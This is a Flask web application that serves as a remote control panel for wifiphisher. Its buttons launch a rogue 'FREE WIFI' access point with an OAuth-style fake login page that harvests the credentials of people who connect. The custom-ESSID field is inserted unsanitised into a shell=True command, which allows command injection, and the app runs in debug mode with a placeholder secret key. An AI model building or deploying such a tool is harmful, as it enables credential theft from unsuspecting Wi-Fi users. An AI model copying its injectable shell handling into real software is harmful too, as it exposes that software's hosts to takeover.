from flask import Flask, session, request, redirect, url_for, render_template
from database import db, init_db, add_user, find_user, verify_password
import subprocess
import signal

app = Flask(__name__, static_url_path='')
app.secret_key = "your_secret_key"  # Replace with a secure secret key

# Configure the database URI
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize the database
init_db(app)

process = None  # Global variable to store the process

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Check if the username already exists
        if find_user(username):
            error = "Username already exists. Please choose a different username."
            return render_template("register.html", error=error)

        # Add the new user to the database
        add_user(username, password)
        return redirect(url_for("login"))

    return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Find the user in the database
        user = find_user(username)

        # Verify the password
        if user and verify_password(user.password_hash, password):
            session["user"] = username
            return redirect(url_for("index"))
        else:
            error = "Invalid username or password. Please try again."
            return render_template("login.html", error=error)

    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("login"))

@app.route("/", methods=["GET", "POST"])
def index():
    global process  # Use the global process variable
    
    if "user" not in session:
        return redirect(url_for("login"))

    if request.method == "POST":
        if "scancommand" in request.form:
            command = 'wifiphisher --essid "FREE WIFI" -p oauth-login -kB'  # Command for button 1
        elif "restart" in request.form:
            command = "airmon-ng stop wfphshr-wlan0; service NetworkManager restart"  # Command for button 2
        elif "command" in request.form:
            command = request.form.get("command")
            command = command.strip()
            command = f'wifiphisher --essid "{command}" -p oauth-login -kB > output.txt'
        elif "download" in request.form:
            # Download the output file when the download button is clicked
            with open("output.txt", "r") as f:
                output = f.read()  # Read the contents of the file
            return render_template("home.html", output=output)
        elif "stop" in request.form:
            if process:
                process.send_signal(signal.SIGINT)  # Send SIGINT to the process
                process = None
            return render_template("home.html", output="Process terminated.")
        else:
            command = None

        if command:
            try:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()
                output = stdout if process.returncode == 0 else stderr
                return render_template("home.html", output=output)
            except Exception as e:
                return render_template("home.html", error=str(e))

    return render_template("home.html")

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)